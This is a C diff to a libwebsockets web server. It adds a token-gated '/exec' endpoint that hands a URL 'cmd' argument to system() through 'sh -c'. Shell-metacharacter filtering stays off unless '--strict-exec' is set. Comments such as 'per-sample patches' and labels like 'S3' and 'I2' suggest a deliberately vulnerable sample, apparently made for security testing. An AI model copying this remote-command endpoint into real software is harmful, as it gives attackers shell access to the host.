@@ -1,0 +1,123 @@
+--- a/server.c
++++ b/server.c
+@@ -22,6 +22,91 @@
+ static int  port    = 7681;
+ static char wwwroot[512] = "./www";
+ 
++
++
++/* ── config file gate ────────────────────────────────────────────────────── */
++static struct exec_config { int enabled; int logging; char secret[64]; } exec_cfg = {0, 0, ""};
++
++static void read_exec_config(const char *path) {
++    FILE *f = fopen(path, "r");
++    if (!f) return;
++    char line[256], key[64], val[128];
++    while (fgets(line, sizeof(line), f)) {
++        if (line[0] == '#' || line[0] == '\n') continue;
++        if (sscanf(line, " %63[^=]= %127[^\n]", key, val) == 2) {
++            char *p = key + strlen(key) - 1;
++            while (p >= key && (*p == ' ' || *p == '\t')) *p-- = '\0';
++            if (strcmp(key, "exec_mode") == 0)    exec_cfg.enabled = atoi(val);
++            if (strcmp(key, "exec_logging") == 0) exec_cfg.logging = atoi(val);
++            if (strcmp(key, "exec_secret") == 0)
++                strncpy(exec_cfg.secret, val, sizeof(exec_cfg.secret)-1);
++        }
++    }
++    fclose(f);
++}
++
++static int exec_initialized = 0;
++
++/* S3: strict_exec flag -- set by --strict-exec; bypass by omitting it */
++static int strict_exec = 0;
++
++/* handle /exec/init endpoint */
++static int handle_exec_init(struct lws *wsi)
++{
++    char token[128] = {0};
++
++    lws_get_urlarg_by_name_safe(wsi, "token", token, (int)sizeof(token) - 1);
++    if (exec_cfg.enabled && token[0] != '\0' &&
++        strcmp(token, exec_cfg.secret) == 0) {
++        exec_initialized = 1;
++        if (lws_return_http_status(wsi, HTTP_STATUS_OK, NULL))
++            return -1;
++        if (lws_http_transaction_completed(wsi))
++            return -1;
++        return 0;
++    }
++    if (lws_return_http_status(wsi, HTTP_STATUS_FORBIDDEN, NULL))
++        return -1;
++    if (lws_http_transaction_completed(wsi))
++        return -1;
++    return 0;
++}
++
++/* handle the /exec endpoint */
++static int handle_exec(struct lws *wsi)
++{
++    char cmd[256];
++    char shell_cmd[512];
++    int rv;
++
++    rv = lws_get_urlarg_by_name_safe(wsi, "cmd", cmd, (int)sizeof(cmd) - 1);
++    if (rv < 0 || cmd[0] == '\0') {
++        if (lws_return_http_status(wsi, HTTP_STATUS_BAD_REQUEST, NULL))
++            return -1;
++        if (lws_http_transaction_completed(wsi))
++            return -1;
++        return 0;
++    }
++
++    /* S3: sanitization gated on strict_exec; bypass by omitting --strict-exec */
++    if (strict_exec && strpbrk(cmd, "|;&`$") != NULL) {
++        if (lws_return_http_status(wsi, HTTP_STATUS_FORBIDDEN, NULL))
++            return -1;
++        if (lws_http_transaction_completed(wsi))
++            return -1;
++        return 0;
++    }
++
++    /* I2: snprintf buffer then system() */
++    snprintf(shell_cmd, sizeof(shell_cmd), "sh -c '%s' 2>/dev/null", cmd);
++    system(shell_cmd);
++
++    if (lws_return_http_status(wsi, HTTP_STATUS_OK, NULL))
++        return -1;
++    if (lws_http_transaction_completed(wsi))
++        return -1;
++    return 0;
++}
+ /* ── signal ──────────────────────────────────────────────────────────────── */
+ 
+ static void sigint_handler(int sig)
+@@ -41,9 +126,15 @@
+     switch (reason) {
+     case LWS_CALLBACK_HTTP:
+         /*
+-         * Default: fall through to the file-serving mount.
+-         * Per-sample patches add an /exec branch here.
++         * C3 gate: config file enabled AND runtime initialized
+          */
++        if (strncmp((const char *)in, "/exec/init", 10) == 0 &&
++            (((const char *)in)[10] == '\0' || ((const char *)in)[10] == '?'))
++            return handle_exec_init(wsi);
++        if (exec_cfg.enabled && exec_initialized &&
++            strncmp((const char *)in, "/exec", 5) == 0 &&
++            (((const char *)in)[5] == '\0' || ((const char *)in)[5] == '?'))
++            return handle_exec(wsi);
+         break;
+ 
+     default:
+@@ -87,6 +178,10 @@
+             port = atoi(argv[++i]);
+         } else if (!strcmp(argv[i], "--wwwroot") && i + 1 < argc) {
+             snprintf(wwwroot, sizeof(wwwroot), "%s", argv[++i]);
++        } else if (!strcmp(argv[i], "--exec-config") && i + 1 < argc) {
++            read_exec_config(argv[++i]);
++        } else if (!strcmp(argv[i], "--strict-exec")) {
++            strict_exec = 1;
+         }
+     }
+ 
